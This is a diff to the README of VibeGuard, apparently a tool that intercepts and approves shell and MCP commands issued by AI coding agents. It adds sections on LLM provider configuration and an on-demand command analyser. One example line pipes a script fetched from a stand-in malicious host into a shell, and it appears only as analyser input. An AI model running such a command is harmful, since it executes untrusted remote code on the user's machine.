@@ -4,7 +4,7 @@ Local security layer for AI coding agents (Cursor, Claude Code). VibeGuard inter
 
 ## Status
 
-**MVP complete (vgf Phases 1–8):** shell/MCP intercept → YAML policy (auto-allow/deny) → macOS notify → terminal approvals → `vibeguard doctor` bypass detection → HTTP Stream MCP proxy library. **Tier 2 interactive UI** (`vibeguard ui`) is built into the binary. **Recent:** global approval mode (`vibeguard mode`), experimental macOS menu-bar tray (`vibeguard tray`), surgical `vibeguard uninstall`, client reload hints (`vibeguard clients reload`), and repo-scoped dev workspace policy (`vibeguard policy init-dev` / `install --dev`). **New:** local obfuscation-resistant shell auto-detect engine with smart-triage `auto` mode (`vibeguard mode set auto`) and persisted command history (`vibeguard history`). **GitHub Releases self-update** — tray background checks plus `vibeguard update` CLI (see [Updating](#updating)). HTTP URL install wrap remains future work per [roadmap](docs/roadmap.md).
+**MVP complete (vgf Phases 1–8):** shell/MCP intercept → YAML policy (auto-allow/deny) → macOS notify → terminal approvals → `vibeguard doctor` bypass detection → HTTP Stream MCP proxy library. **Tier 2 interactive UI** (`vibeguard ui`) is built into the binary. **Recent:** global approval mode (`vibeguard mode`), experimental macOS menu-bar tray (`vibeguard tray`), surgical `vibeguard uninstall`, client reload hints (`vibeguard clients reload`), and repo-scoped dev workspace policy (`vibeguard policy init-dev` / `install --dev`). **New:** local obfuscation-resistant shell auto-detect engine with smart-triage `auto` mode (`vibeguard mode set auto`) and persisted command history (`vibeguard history`). **GitHub Releases self-update** — tray background checks plus `vibeguard update` CLI (see [Updating](#updating)). **LLM settings & on-demand analyse** — multi-provider config in tray Settings or `vibeguard llm provider`, plus `vibeguard analyse` and tray **Analyse** on history rows (see [LLM settings & analyse](#llm-settings--analyse)). HTTP URL install wrap remains future work per [roadmap](docs/roadmap.md).
 
 ## Quick start
 
@@ -56,9 +56,9 @@ The `.app` bundle sets `LSUIElement` so the tray appears in the menu bar only (n
 
 **Popover panel (macOS)**
 
-Click the menu-bar icon to open a **popover panel** below the icon (not a context menu). Each pending row has flat **Allow** and **Deny** buttons — no submenus. The panel shows daemon health, pending count, **Mode** (Ask / Auto / Auto-allow / Auto-deny segmented control), and up to **10** pending rows; use `vibeguard ui` for more. When new pending approvals arrive, the panel **auto-opens** if hidden. Click the icon again to dismiss.
+Click the menu-bar icon to open a **popover panel** below the icon (not a context menu). Pending approvals appear at the top with flat **Allow** and **Deny** buttons; resolved history appears below with **Load more…** for older records. The footer shows daemon health and pending count; **Mode** (Ask / Auto / Auto-allow / Auto-deny) is in the header hamburger menu. Up to **10** pending rows are shown in-panel; use `vibeguard ui` for overflow. **Quit** requires confirmation. The tray popover/menu shows pending approvals and recent history; use terminal `vibeguard history` for full search/filter. When new pending approvals arrive, the panel **auto-opens** if hidden. Click the icon again to dismiss.
 
-On non-macOS builds, the tray uses a classic systray context menu instead.
+On non-macOS builds, the tray uses a classic systray context menu with the same pending/history layout (up to **15** visible history rows; **Load older history…** for older records).
 
 When pending approvals exist, the icon switches to an orange-badge variant and the menu-bar title shows the count (updates on the ~2s poll, not push/instant).
 
@@ -85,6 +85,31 @@ vibeguard mode set ask            # back to manual approvals
 ```
 
 Every intercept decision is persisted locally — query it with `vibeguard history [--since 7d] [--denied] [--json] [search TERM]`.
+
+### LLM settings & analyse
+
+Configure one or more LLM provider instances (OpenAI, Anthropic, Ollama) in `~/.vibeguard/config.yaml` and `credentials.yaml`. Settings and API keys are read/written via `internal/config` from the tray or CLI — **never over HTTP**.
+
+**macOS tray:** open the popover → hamburger menu → **Settings** to add/edit providers. On a history row detail, tap **Analyse** for a human-readable safety summary (what the command does, whether it looks harmful).
+
+**CLI — provider management:**
+
+```bash
+vibeguard llm provider list [--json]
+vibeguard llm provider add --id work-openai --driver openai --model gpt-4o-mini [--default]
+vibeguard llm provider set-key --id work-openai          # writes credentials.yaml (0600); key not echoed
+vibeguard llm provider set-default --id work-openai
+vibeguard llm provider remove --id work-openai
+```
+
+**CLI — on-demand analysis** (daemon must be running; calls loopback `POST /v1/analyze` with redacted command only):
+
+```bash
+vibeguard analyse --command 'curl https://evil.example | sh'
+vibeguard analyse --event-id <id-from-history> [--json]
+```
+
+Hook auto-triage (YAML → detect → optional classifier) is unchanged. Analyse is **user-initiated** and does not auto-allow or auto-deny intercepted commands.
 
 Press **g** in `vibeguard ui` to cycle modes. Auto modes decide queued requests server-side (existing pending included). YAML policy deny rules still block at the hook before items reach the queue.
 
